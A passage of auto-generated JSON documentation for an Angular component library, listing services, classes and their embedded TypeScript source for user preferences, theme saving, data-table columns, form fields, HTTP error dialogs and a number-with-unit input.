                "deprecationMessage": "",
                "tagName": {
                  "text": "param"
                }
              }
            ]
          },
          {
            "name": "setPreferences",
            "args": [
              {
                "name": "value",
                "type": "Record<string | >",
                "deprecated": false,
                "deprecationMessage": ""
              }
            ],
            "optional": false,
            "returnType": "void",
            "typeParameters": [],
            "line": 40,
            "deprecated": false,
            "deprecationMessage": "",
            "modifierKind": [
              123
            ],
            "jsdoctags": [
              {
                "name": "value",
                "type": "Record<string | >",
                "deprecated": false,
                "deprecationMessage": "",
                "tagName": {
                  "text": "param"
                }
              }
            ]
          }
        ],
        "deprecated": false,
        "deprecationMessage": "",
        "description": "",
        "rawdescription": "\n",
        "sourceCode": "import { Injectable } from '@angular/core';\r\nimport { BehaviorSubject } from 'rxjs';\r\n\r\nconst preferenceKey = 'TOPS_IM:UserPreferences';\r\n\r\n@Injectable()\r\nexport class StoUserPreferenceService {\r\n\r\n  public hasSelectTextOnFocusEnabled = new BehaviorSubject<boolean>(true);\r\n  public preferences: {\r\n    hasSelectTextOnFocusEnabled: boolean;\r\n  };\r\n  public default = {\r\n    hasSelectTextOnFocusEnabled: true\r\n  };\r\n\r\n\r\n  constructor() {\r\n    let sessionPreferences = {};\r\n    const sessionPreferencesString = this.getPreferences();\r\n    try {\r\n      sessionPreferences = JSON.parse(sessionPreferencesString);\r\n    } catch ( e ) {\r\n      console.error('Unable to parse the preferences from local storage. Loading default');\r\n    }\r\n    this.preferences = { ...this.default, ...sessionPreferences };\r\n    this.setHasSelectTextOnFocusEnabled(this.preferences.hasSelectTextOnFocusEnabled);\r\n  }\r\n\r\n  public setHasSelectTextOnFocusEnabled(value: boolean) {\r\n    this.hasSelectTextOnFocusEnabled.next(value);\r\n    this.preferences.hasSelectTextOnFocusEnabled = value;\r\n    this.setPreferences(this.preferences);\r\n  }\r\n\r\n  public getPreferences() {\r\n    return sessionStorage.getItem(preferenceKey) || '{}';\r\n  }\r\n\r\n  public setPreferences(value: Record<string, unknown>) {\r\n    sessionStorage.setItem(preferenceKey, JSON.stringify(value));\r\n  }\r\n}\r\n",
        "constructorObj": {
          "name": "constructor",
          "description": "",
          "deprecated": false,
          "deprecationMessage": "",
          "args": [],
          "line": 15
        },
        "type": "injectable"
      },
      {
        "name": "ThemeSaverService",
        "id": "injectable-ThemeSaverService-9f3646a28336bb924cadecd5607c989443edb948c1737023433478cc0edfbf8a183a5d31aa1ac2d4b508c3de9ca988279764d49f0f34b3b5488e7e9c7464ed29",
        "file": "libs/common/src/lib/theme/theme-saver.service.ts",
        "properties": [],
        "methods": [
          {
            "name": "load",
            "args": [
              {
                "name": "type",
                "type": "\"typography\" | \"theme\"",
                "deprecated": false,
                "deprecationMessage": ""
              }
            ],
            "optional": false,
            "returnType": "Observable<ThemeModel>",
            "typeParameters": [],
            "line": 19,
            "deprecated": false,
            "deprecationMessage": "",
            "jsdoctags": [
              {
                "name": "type",
                "type": "\"typography\" | \"theme\"",
                "deprecated": false,
                "deprecationMessage": "",
                "tagName": {
                  "text": "param"
                }
              }
            ]
          },
          {
            "name": "save",
            "args": [
              {
                "name": "model",
                "type": "ThemeModel",
                "deprecated": false,
                "deprecationMessage": ""
              }
            ],
            "optional": false,
            "returnType": "Observable<ThemeModel>",
            "typeParameters": [],
            "line": 27,
            "deprecated": false,
            "deprecationMessage": "",
            "jsdoctags": [
              {
                "name": "model",
                "type": "ThemeModel",
                "deprecated": false,
                "deprecationMessage": "",
                "tagName": {
                  "text": "param"
                }
              }
            ]
          }
        ],
        "deprecated": false,
        "deprecationMessage": "",
        "description": "",
        "rawdescription": "\n",
        "sourceCode": "import { Injectable, InjectionToken } from '@angular/core';\r\nimport { ThemeModel, ThemeName, TypographyName } from './models';\r\nimport { Observable, of } from 'rxjs';\r\n\r\ntype ReturnValue<T> = Promise<T> | Observable<T> | T;\r\n\r\nexport interface ThemeSaver<T = ReturnValue<ThemeModel>> {\r\n  save(model: ThemeModel): T;\r\n\r\n  load(type?: 'typography' | 'theme'): T;\r\n\r\n  remove?(): ReturnValue<void>;\r\n}\r\n\r\nexport const THEME_SAVER = new InjectionToken<ThemeSaver>('sto__theme__typo');\r\n\r\n@Injectable({ providedIn: 'root' })\r\nexport class ThemeSaverService implements ThemeSaver {\r\n  load(type: 'typography' | 'theme'): Observable<ThemeModel> {\r\n    let value = localStorage.getItem('tops__' + type) as TypographyName | ThemeName;\r\n    if ( !value ) {\r\n      value = type === 'typography' ? 'medium' : 'light';\r\n    }\r\n    return of({ value, type });\r\n  }\r\n\r\n  save(model: ThemeModel): Observable<ThemeModel> {\r\n    localStorage.setItem('tops__' + model.type, model.value);\r\n    return of(model);\r\n  }\r\n}\r\n",
        "type": "injectable"
      }
    ],
  "guards": [],
  "interceptors": [],
  "classes": [
    {
      "name": "Action",
      "id": "class-Action-f7a082130826af0b2964a0fcb509ae170ff61a528e5c1a6056c5db46329fc067ec84edd7cfc4025a3096f7d5eed25f0bb90e8890945d33832f4019d33c2939b7",
      "file": "libs/error-handler/src/lib/error-handler/http-error.ts",
      "deprecated": false,
      "deprecationMessage": "",
      "type": "class",
      "sourceCode": "import { HttpErrorResponse } from '@angular/common/http';\r\n\r\n/**\r\n * Internal HttpError format\r\n */\r\nexport class HttpError {\r\n  // Status code\r\n  status: number;\r\n  // Dialog title\r\n  title: string;\r\n  // Dialog body\r\n  text: string;\r\n  // Action list.\r\n  actions: Action[] = [];\r\n\r\n  constructor(public readonly error: HttpErrorResponse) {\r\n    this.status = error.status;\r\n  }\r\n}\r\n\r\n/**\r\n * Available properties on dialog actions\r\n */\r\nexport class Action {\r\n  /**\r\n   * Button label\r\n   */\r\n  label: string;\r\n  /**\r\n   * A function to be called based on the given action (e.g window.location.reload to refresh the tab)\r\n   */\r\n  action?: (...args: unknown[]) => unknown;\r\n  /**\r\n   * The data to be returned when the dialog is closed.\r\n   */\r\n  closeDialogData?: Record<string, unknown>;\r\n\r\n  constructor(label: string);\r\n  constructor(label: string, close: () => void);\r\n  constructor(label: string, close: Record<string, unknown>);\r\n  constructor(label: string, close?: Record<string, unknown> | (() => unknown)) {\r\n    this.label = label;\r\n    if ( typeof close === 'function' ) {\r\n      // eslint-disable-next-line @typescript-eslint/ban-ts-comment\r\n      // @ts-ignore\r\n      this.action = close;\r\n    } else {\r\n      this.closeDialogData = close;\r\n    }\r\n  }\r\n}\r\n",
      "constructorObj": {
        "name": "constructor",
        "description": "",
        "deprecated": false,
        "deprecationMessage": "",
        "args": [
          {
            "name": "label",
            "type": "string",
            "deprecated": false,
            "deprecationMessage": ""
          },
          {
            "name": "close",
            "type": "Record<string | > | ",
            "deprecated": false,
            "deprecationMessage": "",
            "optional": true
          }
        ],
        "line": 40,
        "jsdoctags": [
          {
            "name": "label",
            "type": "string",
            "deprecated": false,
            "deprecationMessage": "",
            "tagName": {
              "text": "param"
            }
          },
          {
            "name": "close",
            "type": "Record<string | > | ",
            "deprecated": false,
            "deprecationMessage": "",
            "optional": true,
            "tagName": {
              "text": "param"
            }
          }
        ]
      },
      "properties": [
        {
          "name": "action",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "function",
          "optional": true,
          "description": "<p>A function to be called based on the given action (e.g window.location.reload to refresh the tab)</p>\n",
          "line": 32,
          "rawdescription": "\n\nA function to be called based on the given action (e.g window.location.reload to refresh the tab)\n"
        },
        {
          "name": "closeDialogData",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "Record<string | >",
          "optional": true,
          "description": "<p>The data to be returned when the dialog is closed.</p>\n",
          "line": 36,
          "rawdescription": "\n\nThe data to be returned when the dialog is closed.\n"
        },
        {
          "name": "label",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "string",
          "optional": false,
          "description": "<p>Button label</p>\n",
          "line": 28,
          "rawdescription": "\n\nButton label\n"
        }
      ],
      "description": "<p>Available properties on dialog actions</p>\n",
      "rawdescription": "\n\nAvailable properties on dialog actions\n",
      "methods": [],
      "indexSignatures": [],
      "inputsClass": [],
      "outputsClass": [],
      "hostBindings": [],
      "hostListeners": []
    },
    {
      "name": "Column",
      "id": "class-Column-c6a3448a75b315e84827e511b55f2e9560fe45055e3a73b82bccf8fde6558744df9274b293adf4c87fa200f72b3bde5446858f0c052da2a6f7f482bc2d2ff5af",
      "file": "libs/datatable/src/lib/sto-datatable/columns.ts",
      "deprecated": false,
      "deprecationMessage": "",
      "type": "class",
      "sourceCode": "import { TemplateRef } from '@angular/core';\r\n\r\nexport class Column {\r\n  $$id?: string;\r\n  prop: string;\r\n  name: string;\r\n  flexGrow?: number;\r\n  flexBasis?: number;\r\n  flexShrink?: number;\r\n  sortable ? = false;\r\n  headerTemplate?: TemplateRef<unknown>;\r\n  cellTemplate?: TemplateRef<unknown>;\r\n  footerTemplate?: TemplateRef<unknown>;\r\n  cellClass?: string | ClassFunction;\r\n  headerClass?: string | ClassFunction;\r\n  sortFn?: SortFunction;\r\n  disableSort?: boolean;\r\n  disableResize?: boolean;\r\n}\r\n\r\nexport class ColumnGroup {\r\n  name: string;\r\n  columnStart: number;\r\n  columnEnd: number;\r\n  transform?: string;\r\n}\r\n\r\nexport enum ColumnDisplay {\r\n  Flex = 'flex',\r\n  Force = 'force'\r\n}\r\n\r\ntype ClassFunction = <T, U>(value: T, row: U, column: Column) => string | string[];\r\ntype SortFunction = <T>(a: T, b: T, column: Column) => number;\r\n",
      "properties": [
        {
          "name": "$$id",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "string",
          "optional": true,
          "description": "",
          "line": 4
        },
        {
          "name": "cellClass",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "string | ClassFunction",
          "optional": true,
          "description": "",
          "line": 14
        },
        {
          "name": "cellTemplate",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "TemplateRef<>",
          "optional": true,
          "description": "",
          "line": 12
        },
        {
          "name": "disableResize",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "boolean",
          "optional": true,
          "description": "",
          "line": 18
        },
        {
          "name": "disableSort",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "boolean",
          "optional": true,
          "description": "",
          "line": 17
        },
        {
          "name": "flexBasis",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "number",
          "optional": true,
          "description": "",
          "line": 8
        },
        {
          "name": "flexGrow",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "number",
          "optional": true,
          "description": "",
          "line": 7
        },
        {
          "name": "flexShrink",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "number",
          "optional": true,
          "description": "",
          "line": 9
        },
        {
          "name": "footerTemplate",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "TemplateRef<>",
          "optional": true,
          "description": "",
          "line": 13
        },
        {
          "name": "headerClass",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "string | ClassFunction",
          "optional": true,
          "description": "",
          "line": 15
        },
        {
          "name": "headerTemplate",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "TemplateRef<>",
          "optional": true,
          "description": "",
          "line": 11
        },
        {
          "name": "name",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "string",
          "optional": false,
          "description": "",
          "line": 6
        },
        {
          "name": "prop",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "string",
          "optional": false,
          "description": "",
          "line": 5
        },
        {
          "name": "sortable",
          "defaultValue": "false",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "",
          "optional": true,
          "description": "",
          "line": 10
        },
        {
          "name": "sortFn",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "SortFunction",
          "optional": true,
          "description": "",
          "line": 16
        }
      ],
      "methods": [],
      "indexSignatures": [],
      "inputsClass": [],
      "outputsClass": [],
      "hostBindings": [],
      "hostListeners": []
    },
    {
      "name": "ColumnGroup",
      "id": "class-ColumnGroup-c6a3448a75b315e84827e511b55f2e9560fe45055e3a73b82bccf8fde6558744df9274b293adf4c87fa200f72b3bde5446858f0c052da2a6f7f482bc2d2ff5af",
      "file": "libs/datatable/src/lib/sto-datatable/columns.ts",
      "deprecated": false,
      "deprecationMessage": "",
      "type": "class",
      "sourceCode": "import { TemplateRef } from '@angular/core';\r\n\r\nexport class Column {\r\n  $$id?: string;\r\n  prop: string;\r\n  name: string;\r\n  flexGrow?: number;\r\n  flexBasis?: number;\r\n  flexShrink?: number;\r\n  sortable ? = false;\r\n  headerTemplate?: TemplateRef<unknown>;\r\n  cellTemplate?: TemplateRef<unknown>;\r\n  footerTemplate?: TemplateRef<unknown>;\r\n  cellClass?: string | ClassFunction;\r\n  headerClass?: string | ClassFunction;\r\n  sortFn?: SortFunction;\r\n  disableSort?: boolean;\r\n  disableResize?: boolean;\r\n}\r\n\r\nexport class ColumnGroup {\r\n  name: string;\r\n  columnStart: number;\r\n  columnEnd: number;\r\n  transform?: string;\r\n}\r\n\r\nexport enum ColumnDisplay {\r\n  Flex = 'flex',\r\n  Force = 'force'\r\n}\r\n\r\ntype ClassFunction = <T, U>(value: T, row: U, column: Column) => string | string[];\r\ntype SortFunction = <T>(a: T, b: T, column: Column) => number;\r\n",
      "properties": [
        {
          "name": "columnEnd",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "number",
          "optional": false,
          "description": "",
          "line": 24
        },
        {
          "name": "columnStart",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "number",
          "optional": false,
          "description": "",
          "line": 23
        },
        {
          "name": "name",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "string",
          "optional": false,
          "description": "",
          "line": 22
        },
        {
          "name": "transform",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "string",
          "optional": true,
          "description": "",
          "line": 25
        }
      ],
      "methods": [],
      "indexSignatures": [],
      "inputsClass": [],
      "outputsClass": [],
      "hostBindings": [],
      "hostListeners": []
    },
    {
      "name": "FormFieldBase",
      "id": "class-FormFieldBase-32a2bbfb6ff0e9d263a170d86ab1af60cf66dab5bc7f23f4af3245a80265420ed5c4b9e68eaa982bfb0edccdc54a0042caa09797e07fe7eff8873bfe6124b1b5",
      "file": "libs/form/src/lib/sto-form/form-field.base.ts",
      "deprecated": false,
      "deprecationMessage": "",
      "type": "class",
      "sourceCode": "import { Subject } from 'rxjs';\r\nimport { ErrorStateMatcher } from '@angular/material/core';\r\nimport { FormControl, FormGroupDirective, NgControl, NgForm } from '@angular/forms';\r\nimport { ElementRef } from '@angular/core';\r\n\r\nexport class FormFieldBase {\r\n  /** Whether the component is in an error state. */\r\n  errorState = false;\r\n\r\n  /**\r\n   * Stream that emits whenever the state of the input changes such that the wrapping\r\n   * `MatFormField` needs to run change detection.\r\n   */\r\n  stateChanges: Subject<void>;\r\n\r\n  errorStateMatcher: ErrorStateMatcher;\r\n\r\n  constructor(public _elementRef: ElementRef,\r\n              public _defaultErrorStateMatcher: ErrorStateMatcher,\r\n              public _parentForm: NgForm,\r\n              public _parentFormGroup: FormGroupDirective,\r\n              public ngControl: NgControl) {\r\n  }\r\n\r\n  updateErrorState() {\r\n    const oldState = this.errorState;\r\n    const parent = this._parentFormGroup || this._parentForm;\r\n    const matcher = this.errorStateMatcher || this._defaultErrorStateMatcher;\r\n    const control = this.ngControl ? this.ngControl.control as FormControl : null;\r\n    const newState = matcher.isErrorState(control, parent);\r\n\r\n    if ( newState !== oldState ) {\r\n      this.errorState = newState;\r\n      this.stateChanges.next();\r\n    }\r\n  }\r\n}\r\n",
      "constructorObj": {
        "name": "constructor",
        "description": "",
        "deprecated": false,
        "deprecationMessage": "",
        "args": [
          {
            "name": "_elementRef",
            "type": "ElementRef",
            "deprecated": false,
            "deprecationMessage": ""
          },
          {
            "name": "_defaultErrorStateMatcher",
            "type": "ErrorStateMatcher",
            "deprecated": false,
            "deprecationMessage": ""
          },
          {
            "name": "_parentForm",
            "type": "NgForm",
            "deprecated": false,
            "deprecationMessage": ""
          },
          {
            "name": "_parentFormGroup",
            "type": "FormGroupDirective",
            "deprecated": false,
            "deprecationMessage": ""
          },
          {
            "name": "ngControl",
            "type": "NgControl",
            "deprecated": false,
            "deprecationMessage": ""
          }
        ],
        "line": 16,
        "jsdoctags": [
          {
            "name": "_elementRef",
            "type": "ElementRef",
            "deprecated": false,
            "deprecationMessage": "",
            "tagName": {
              "text": "param"
            }
          },
          {
            "name": "_defaultErrorStateMatcher",
            "type": "ErrorStateMatcher",
            "deprecated": false,
            "deprecationMessage": "",
            "tagName": {
              "text": "param"
            }
          },
          {
            "name": "_parentForm",
            "type": "NgForm",
            "deprecated": false,
            "deprecationMessage": "",
            "tagName": {
              "text": "param"
            }
          },
          {
            "name": "_parentFormGroup",
            "type": "FormGroupDirective",
            "deprecated": false,
            "deprecationMessage": "",
            "tagName": {
              "text": "param"
            }
          },
          {
            "name": "ngControl",
            "type": "NgControl",
            "deprecated": false,
            "deprecationMessage": "",
            "tagName": {
              "text": "param"
            }
          }
        ]
      },
      "properties": [
        {
          "name": "_defaultErrorStateMatcher",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "ErrorStateMatcher",
          "optional": false,
          "description": "",
          "line": 19,
          "modifierKind": [
            123
          ]
        },
        {
          "name": "_elementRef",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "ElementRef",
          "optional": false,
          "description": "",
          "line": 18,
          "modifierKind": [
            123
          ]
        },
        {
          "name": "_parentForm",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "NgForm",
          "optional": false,
          "description": "",
          "line": 20,
          "modifierKind": [
            123
          ]
        },
        {
          "name": "_parentFormGroup",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "FormGroupDirective",
          "optional": false,
          "description": "",
          "line": 21,
          "modifierKind": [
            123
          ]
        },
        {
          "name": "errorState",
          "defaultValue": "false",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "",
          "optional": false,
          "description": "<p>Whether the component is in an error state.</p>\n",
          "line": 8,
          "rawdescription": "\nWhether the component is in an error state."
        },
        {
          "name": "errorStateMatcher",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "ErrorStateMatcher",
          "optional": false,
          "description": "",
          "line": 16
        },
        {
          "name": "ngControl",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "NgControl",
          "optional": false,
          "description": "",
          "line": 22,
          "modifierKind": [
            123
          ]
        },
        {
          "name": "stateChanges",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "Subject<void>",
          "optional": false,
          "description": "<p>Stream that emits whenever the state of the input changes such that the wrapping\n<code>MatFormField</code> needs to run change detection.</p>\n",
          "line": 14,
          "rawdescription": "\n\nStream that emits whenever the state of the input changes such that the wrapping\n`MatFormField` needs to run change detection.\n"
        }
      ],
            "methods": [
              {
                "name": "updateErrorState",
                "args": [],
                "optional": false,
                "returnType": "void",
                "typeParameters": [],
                "line": 25,
                "deprecated": false,
                "deprecationMessage": ""
              }
            ],
      "indexSignatures": [],
      "inputsClass": [],
      "outputsClass": [],
      "hostBindings": [],
      "hostListeners": []
    },
    {
      "name": "HttpError",
      "id": "class-HttpError-f7a082130826af0b2964a0fcb509ae170ff61a528e5c1a6056c5db46329fc067ec84edd7cfc4025a3096f7d5eed25f0bb90e8890945d33832f4019d33c2939b7",
      "file": "libs/error-handler/src/lib/error-handler/http-error.ts",
      "deprecated": false,
      "deprecationMessage": "",
      "type": "class",
      "sourceCode": "import { HttpErrorResponse } from '@angular/common/http';\r\n\r\n/**\r\n * Internal HttpError format\r\n */\r\nexport class HttpError {\r\n  // Status code\r\n  status: number;\r\n  // Dialog title\r\n  title: string;\r\n  // Dialog body\r\n  text: string;\r\n  // Action list.\r\n  actions: Action[] = [];\r\n\r\n  constructor(public readonly error: HttpErrorResponse) {\r\n    this.status = error.status;\r\n  }\r\n}\r\n\r\n/**\r\n * Available properties on dialog actions\r\n */\r\nexport class Action {\r\n  /**\r\n   * Button label\r\n   */\r\n  label: string;\r\n  /**\r\n   * A function to be called based on the given action (e.g window.location.reload to refresh the tab)\r\n   */\r\n  action?: (...args: unknown[]) => unknown;\r\n  /**\r\n   * The data to be returned when the dialog is closed.\r\n   */\r\n  closeDialogData?: Record<string, unknown>;\r\n\r\n  constructor(label: string);\r\n  constructor(label: string, close: () => void);\r\n  constructor(label: string, close: Record<string, unknown>);\r\n  constructor(label: string, close?: Record<string, unknown> | (() => unknown)) {\r\n    this.label = label;\r\n    if ( typeof close === 'function' ) {\r\n      // eslint-disable-next-line @typescript-eslint/ban-ts-comment\r\n      // @ts-ignore\r\n      this.action = close;\r\n    } else {\r\n      this.closeDialogData = close;\r\n    }\r\n  }\r\n}\r\n",
      "constructorObj": {
        "name": "constructor",
        "description": "",
        "deprecated": false,
        "deprecationMessage": "",
        "args": [
          {
            "name": "error",
            "type": "HttpErrorResponse",
            "deprecated": false,
            "deprecationMessage": ""
          }
        ],
        "line": 14,
        "jsdoctags": [
          {
            "name": "error",
            "type": "HttpErrorResponse",
            "deprecated": false,
            "deprecationMessage": "",
            "tagName": {
              "text": "param"
            }
          }
        ]
      },
      "properties": [
        {
          "name": "actions",
          "defaultValue": "[]",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "Action[]",
          "optional": false,
          "description": "",
          "line": 14
        },
        {
          "name": "error",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "HttpErrorResponse",
          "optional": false,
          "description": "",
          "line": 16,
          "modifierKind": [
            123,
            144
          ]
        },
        {
          "name": "status",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "number",
          "optional": false,
          "description": "",
          "line": 8
        },
        {
          "name": "text",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "string",
          "optional": false,
          "description": "",
          "line": 12
        },
        {
          "name": "title",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "string",
          "optional": false,
          "description": "",
          "line": 10
        }
      ],
      "description": "<p>Internal HttpError format</p>\n",
      "rawdescription": "\n\nInternal HttpError format\n",
      "methods": [],
      "indexSignatures": [],
      "inputsClass": [],
      "outputsClass": [],
      "hostBindings": [],
      "hostListeners": []
    },
    {
      "name": "Modifiers",
      "id": "class-Modifiers-1ca22eb2d5c7ba5ff54e9e0af7d22ed71980af2ce88e6b33a5e1c2e4f60154e41d364c666c57a6946e9e1a36860a4877c9e91a2b3ba8e21dbd490ce21416b102",
      "file": "libs/form/src/lib/sto-wysiwyg/modifiers.ts",
      "deprecated": false,
      "deprecationMessage": "",
      "type": "class",
      "sourceCode": "export class Modifiers {\r\n  italic: boolean;\r\n  bold: boolean;\r\n  underline: boolean;\r\n\r\n  static getActiveModifiers(): string[] {\r\n    const m = new Modifiers();\r\n    m.bold = document.queryCommandState('bold');\r\n    m.italic = document.queryCommandState('italic');\r\n    m.underline = document.queryCommandState('underline');\r\n    // eslint-disable-next-line @typescript-eslint/ban-ts-comment\r\n    // @ts-ignore\r\n    return Object.keys(m).filter((k) => m[ k ]);\r\n  }\r\n}\r\n\r\nexport const validCommands = [\r\n  'bold',\r\n  'underline',\r\n  'italic',\r\n  'createLink',\r\n  'insertUnorderedList',\r\n  'insertOrderedList',\r\n  'removeFormat',\r\n];\r\n",
      "properties": [
        {
          "name": "bold",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "boolean",
          "optional": false,
          "description": "",
          "line": 3
        },
        {
          "name": "italic",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "boolean",
          "optional": false,
          "description": "",
          "line": 2
        },
        {
          "name": "underline",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "boolean",
          "optional": false,
          "description": "",
          "line": 4
        }
      ],
      "methods": [
        {
          "name": "getActiveModifiers",
          "args": [],
          "optional": false,
          "returnType": "string[]",
          "typeParameters": [],
          "line": 6,
          "deprecated": false,
          "deprecationMessage": "",
          "modifierKind": [
            124
          ]
        }
      ],
      "indexSignatures": [],
      "inputsClass": [],
      "outputsClass": [],
      "hostBindings": [],
      "hostListeners": []
    },
    {
      "name": "NumberUnit",
      "id": "class-NumberUnit-e781eee0f410e8ab683f1ff7198a8f4410b8ab05b844a5142fb0aa3aa7d4267b9d4035d97892bee3a6e960fbae8ead51f25f981bf2886cdbc9b113063bc9526e",
      "file": "libs/form/src/lib/number-input/number-unit-input/number-unit-input.component.ts",
      "deprecated": false,
      "deprecationMessage": "",
      "type": "class",
      "sourceCode": "import {\r\n  ChangeDetectionStrategy,\r\n  Component,\r\n  DoCheck,\r\n  ElementRef,\r\n  HostBinding,\r\n  Input,\r\n  OnDestroy,\r\n  OnInit,\r\n  Optional,\r\n  Self,\r\n  ViewChild,\r\n  ViewEncapsulation\r\n} from '@angular/core';\r\nimport { ControlValueAccessor, FormBuilder, FormGroup, FormGroupDirective, NgControl, NgForm } from '@angular/forms';\r\nimport { MatFormFieldControl } from '@angular/material/form-field';\r\nimport { Subject, Subscription } from 'rxjs';\r\nimport { FocusMonitor } from '@angular/cdk/a11y';\r\nimport { coerceBooleanProperty } from '@angular/cdk/coercion';\r\nimport { NumberInputPipe } from '../number-input.pipe';\r\nimport { MatSelect } from '@angular/material/select';\r\nimport { FormFieldBase } from '../../sto-form/form-field.base';\r\nimport { ErrorStateMatcher } from '@angular/material/core';\r\nimport { debounceTime } from 'rxjs/operators';\r\nimport { NumberInputDirective } from '../number-input.directive';\r\n\r\nclass NumberUnit {\r\n  value: number | string;\r\n  unit: string;\r\n}\r\n\r\n@Component({\r\n  selector: 'sto-number-unit-input',\r\n  templateUrl: './number-unit-input.component.html',\r\n  styleUrls: [ './number-unit-input.component.scss' ],\r\n  providers: [\r\n    { provide: MatFormFieldControl, useExisting: NumberUnitInputComponent }\r\n  ],\r\n  encapsulation: ViewEncapsulation.None,\r\n  changeDetection: ChangeDetectionStrategy.OnPush\r\n})\r\nexport class NumberUnitInputComponent extends FormFieldBase\r\n  implements DoCheck, OnInit, OnDestroy, ControlValueAccessor, MatFormFieldControl<NumberUnit> {\r\n  static nextId = 0;\r\n  stateChanges = new Subject<void>();\r\n  public form: FormGroup;\r\n  readonly autofilled: boolean;\r\n  controlType = 'number-unit-input';\r\n  private numberFormatterPipe = new NumberInputPipe();\r\n  @ViewChild(MatSelect)\r\n  select: MatSelect;\r\n  @ViewChild('input')\r\n  input: ElementRef<HTMLInputElement>;\r\n  @ViewChild(NumberInputDirective)\r\n  numberInputDirective: NumberInputDirective;\r\n\r\n  errorState: boolean;\r\n\r\n  @Input()\r\n  unitOptional = true;\r\n  @Input()\r\n  unitClearText = '(none)';\r\n\r\n  @Input()\r\n  get disabled(): boolean {\r\n    return this._disabled;\r\n  }\r\n\r\n  set disabled(disable: boolean) {\r\n    this._disabled = coerceBooleanProperty(disable);\r\n    const opts = { onlySelf: true, emitEvent: false };\r\n    disable ? this.form.disable(opts) : this.form.enable(opts);\r\n    // disable ? this.form.get('unit').disable(opts) : this.form.get('unit').enable(opts);\r\n    // disable ? this.form.get('value').disable(opts) : this.form.get('value').enable(opts);\r\n    this.stateChanges.next();\r\n  }\r\n\r\n  private _disabled = false;\r\n\r\n  @Input()\r\n  get readonly(): boolean {\r\n    return this._readonly;\r\n  }\r\n\r\n  set readonly(value: boolean) {\r\n    this._readonly = coerceBooleanProperty(value);\r\n    const opts = { onlySelf: true, emitEvent: false };\r\n    value ? this.form.get('unit')?.disable(opts) : this.form.get('unit')?.enable(opts);\r\n    this.stateChanges.next();\r\n  }\r\n\r\n  private _readonly = false;\r\n\r\n  @Input()\r\n  get list() {\r\n    return this._list;\r\n  }\r\n\r\n  set list(value) {\r\n    this._list = value;\r\n    this.stateChanges.next();\r\n  }\r\n\r\n  private _list: { value: unknown; title?: string; }[] = [];\r\n\r\n  @Input()\r\n  get fractionSize() {\r\n    return this._fractionSize || 3;\r\n  }\r\n\r\n  set fractionSize(fractionSize) {\r\n    this._fractionSize = fractionSize;\r\n    this.stateChanges.next();\r\n  }\r\n\r\n  private _fractionSize: number;\r\n\r\n  get empty() {\r\n    const n = this.form.value;\r\n    return !n.value && !n.unit;\r\n  }\r\n\r\n  public focused: boolean;\r\n\r\n\r\n  @HostBinding()\r\n  id = `value-unit-input-${NumberUnitInputComponent.nextId++}`;\r\n\r\n  @Input()\r\n  get placeholder() {\r\n    return this._placeholder || '';\r\n  }\r\n\r\n  set placeholder(plh) {\r\n    this._placeholder = plh;\r\n    this.stateChanges.next();\r\n  }\r\n\r\n  private _placeholder: string;\r\n\r\n  @Input()\r\n  get unitPlaceholder() {\r\n    return this._unitPlaceholder || '';\r\n  }\r\n\r\n  set unitPlaceholder(plh) {\r\n    this._unitPlaceholder = plh;\r\n    this.stateChanges.next();\r\n  }\r\n\r\n  private _unitPlaceholder: string;\r\n\r\n  @Input()\r\n  get required() {\r\n    return this._required;\r\n  }\r\n\r\n  set required(req) {\r\n    this._required = coerceBooleanProperty(req);\r\n    this.stateChanges.next();\r\n  }\r\n\r\n  private _required = false;\r\n\r\n  @HostBinding('class.floating')\r\n  get shouldLabelFloat() {\r\n    return this.focused || !this.empty;\r\n  }\r\n\r\n  get value(): NumberUnit | null {\r\n    return this._value;\r\n  }\r\n\r\n  set value(value: NumberUnit | null) {\r\n    if ( value ) {\r\n      const parsedValue = this.numberFormatterPipe.transform(value.value, this.fractionSize);\r\n      this._value = { ...value, value: parsedValue };\r\n    } else {\r\n      this._value = value;\r\n    }\r\n    this.form.patchValue(this._value || {}, { emitEvent: false });\r\n    this.stateChanges.next();\r\n  }\r\n\r\n  private _value: NumberUnit | null;\r\n\r\n  @HostBinding('attr.aria-describedby') describedBy = '';\r\n\r\n  public sub = new Subscription();\r\n\r\n\r\n  constructor(@Optional() @Self() public ngControl: NgControl,\r\n              private fm: FocusMonitor,\r\n              private fb: FormBuilder,\r\n              @Optional() _parentForm: NgForm,\r\n              @Optional() _parentFormGroup: FormGroupDirective,\r\n              _defaultErrorStateMatcher: ErrorStateMatcher,\r\n              private elRef: ElementRef<HTMLElement>) {\r\n    super(elRef, _defaultErrorStateMatcher, 